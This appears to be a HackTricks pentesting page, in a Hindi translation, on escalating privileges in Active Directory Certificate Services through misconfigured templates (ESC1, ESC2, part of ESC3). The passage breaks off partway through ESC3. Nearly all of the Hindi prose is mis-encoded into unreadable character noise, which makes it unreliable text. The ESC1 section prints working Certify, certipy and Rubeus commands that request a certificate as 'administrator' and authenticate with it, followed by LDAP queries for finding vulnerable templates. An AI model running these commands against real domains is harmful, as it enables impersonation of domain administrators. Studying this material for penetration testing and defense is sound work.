# AD CS рдбреЛрдореЗрди рдЙрдиреНрдирдпрди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред

</details>

## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ - ESC1

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

* **рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CA** рдирд┐рдореНрди-рдЕрдзрд┐рдХрд╛рд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ
* **рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдЕрдХреНрд╖рдо рд╣реИ**
* **рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**
* рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдкрд░рд╡рд░реНрддреА **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг** рдирд┐рдореНрди-рдЕрдзрд┐рдХрд╛рд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдПрдХреАрдХреГрдд рдХрд░реНрдордЪрд╛рд░реА рдкрд╣рдЪрд╛рди рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╡рд╛рд▓реЗ EKU рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ**:
* _рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (OID 1.3.6.1.5.5.7.3.2), PKINIT рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (1.3.6.1.5.2.3.4), рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди (OID 1.3.6.1.4.1.311.20.2.2), рдХреЛрдИ рдЙрджреНрджреЗрд╢реНрдп (OID 2.5.29.37.0), рдпрд╛ рдХреЛрдИ EKU рдирд╣реАрдВ (SubCA)ред_
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреЛ CSR рдореЗрдВ subjectAltName рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:**
* **AD** рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ **subjectAltName** (SAN) рдлрд╝реАрд▓реНрдб рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрд╣рдЪрд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ **рдЕрдЧрд░** рдпрд╣ **рдореМрдЬреВрдж** рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдПрдХ CSR рдореЗрдВ SAN рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛)ред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреНрдпрд╛ рд╕рдВрджрд░реНрднAltName рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕рдХреЗ **`mspki-certificate-name-`**`flag` рд╕рдВрдкрддреНрддрд┐ред `mspki-certificate-name-flag` рд╕рдВрдкрддреНрддрд┐ рдПрдХ **рдмрд┐рдЯрдорд╛рд╕реНрдХ** рд╣реИ рдФрд░ рдпрджрд┐ **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** рдЭрдВрдбрд╛ **рдореМрдЬреВрдж** рд╣реИ, рддреЛ рдПрдХ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрднAltName рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% hint style="danger" %}
рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдПрдХ **рдирд┐рдореНрди-рдЕрдзрд┐рдХрд╛рд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдЕрдирд┐рдпрдорд┐рдд SAN рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдирд┐рдореНрди-рдЕрдзрд┐рдХрд╛рд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Kerberos рдпрд╛ SChannel рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЛрдореЗрди рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдореБрдЦ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдпрд╣ рдЕрдХреНрд╕рд░ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, HTTPS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рдлреНрд▓рд╛рдИ рдкрд░ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрд╛рджреЛрдВ рдпрд╛ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╛ рдЬреНрдЮрд╛рди рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдгред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдЗрд╕ рдЕрдВрддрд┐рдо рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ **рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддреА рд╣реИ**, рд▓реЗрдХрд┐рди рдпрд╣ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рджрд░реНрд╢рд┐рдд рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдпрджрд┐ рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде **рдбреБрдкреНрд▓рд┐рдХреЗрдЯ** рдХреА рдЬрд╛рддреА рд╣реИ (рдЬреИрд╕реЗ `WebServer` рдЯреЗрдореНрдкрд▓реЗрдЯ рдЬрд┐рд╕рдореЗрдВ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рд╕рдХреНрд╖рдо рд╣реИ рдФрд░ рдлрд┐рд░ рдкреНрд░рд╢рд╛рд╕рдХ рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг OID рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ)ред

### рджреБрд░реБрдкрдпреЛрдЧ

**рд╡рд┐рдХрд▓реНрдк рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЦреЛрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдХреА рднреВрдорд┐рдХрд╛ рдореЗрдВ рдЕрднрд┐рдирдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
рддрдм рдЖрдк рдЙрддреНрдкрдиреНрди **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `.pfx`** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рд╕реЗ Rubeus рдпрд╛ certipy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
рд╡рд┐рдВрдбреЛрдЬ рдмрд╛рдЗрдирд░реА "Certreq.exe" рдФрд░ "Certutil.exe" рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ PFX рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, AD рдлрд╝реЙрд░реЗрд╕реНрдЯ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд LDAP рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдХреА **рд╕реВрдЪреАрдХрд░рдг** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рдордВрдЬреВрд░реА / рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**, рдЬрд┐рдирдореЗрдВ **рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпрд╛ рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди EKU** рд╣реЛрддрд╛ рд╣реИ, рдФрд░ **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** рдлрд╝реНрд▓реИрдЧ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ - ESC2

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рджреВрд╕рд░реА рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐ рдкрд╣рд▓реА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдПрдХ рд░реВрдкрд╛рдВрддрд░рдг рд╣реИ:

1. рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CA рдХрдо-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
2. рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдЕрдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИред
3. рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
4. рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдгрдХрд░реНрддрд╛ рдХрдо-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
5. **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдиреЗ рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU рдпрд╛ рдХреЛрдИ EKU рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рд╣реИред**

**рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU** рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХреЛ **рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рдХреЛрдб рд╕рд╛рдЗрдирд┐рдВрдЧ** рдЖрджрд┐ рдХреЗ рд▓рд┐рдП **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **ESC3 рдХреЗ рд▓рд┐рдП рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдХреЛрдИ EKU рд╡рд╛рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░** - рдПрдХ рдЕрдзреАрдирд╕реНрде CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ - рднреА **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп** рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ рдЕрдзреАрдирд╕реНрде CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдореЗрдВ **рд╡рд┐рдЪрд┐рддреНрд░ EKU рдпрд╛ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **рдЕрдзреАрдирд╕реНрде CA рдХреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ **`NTAuthCertificates`** рд╡рд╕реНрддреБ рджреНрд╡рд╛рд░рд╛ (рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рд╣реЛрдЧрд╛), рддреЛ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ **рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░реЗрдВрдЧреЗред рдлрд┐рд░ рднреА, рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХрд┐рд╕реА рднреА EKU рдХреЗ рд╕рд╛рде **рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдФрд░ рд╡рд┐рдЪрд┐рддреНрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреЛрдВ рдХреЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХреЛрдб рд╕рд╛рдЗрдирд┐рдВрдЧ, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдЖрджрд┐) рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдЕрдиреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдмрдбрд╝реЗ рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ SAML, AD FS, рдпрд╛ IPSecред

рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рдорд┐рд▓рддреЗ-рдЬреБрд▓рддреЗ рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП AD рдлрд╝реЙрд░реЗрд╕реНрдЯ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд LDAP рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## рдЧрд▓рдд рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ - ESC3

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд╣рд▓реЗ рдФрд░ рджреВрд╕рд░реЗ рдЬреИрд╕рд╛ рд╣реА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдПрдХ **рдЕрд▓рдЧ EKU** (рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдПрдЬреЗрдВрдЯ) рдФрд░ **2 рдЕрд▓рдЧ рдЯреЗрдореНрдкрд▓реЗрдЯ** (рдЗрд╕рд▓рд┐рдП рдЗрд╕рдореЗрдВ 2 рд╕реЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реЛрддреА рд╣реИрдВ) рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдПрдЬреЗрдВрдЯ EKU** (OID 1.3.6.1.4.1.311.20.2.1), рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рдзрд╛рди рдХреЛ рдПрдХ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд▓рд┐рдП **рдПрдирд░реЛрд▓** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**"рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ"** рдЗрд╕ рддрд░рд╣ рдХреЗ рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдореЗрдВ рдПрдирд░реЛрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП CSR рдХреЛ-рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**ред рдлрд┐рд░ рдпрд╣ **рдХреЛ-рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП CSR** рдХреЛ рд╕реАрдП рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **"рджреВрд╕рд░реЗ" 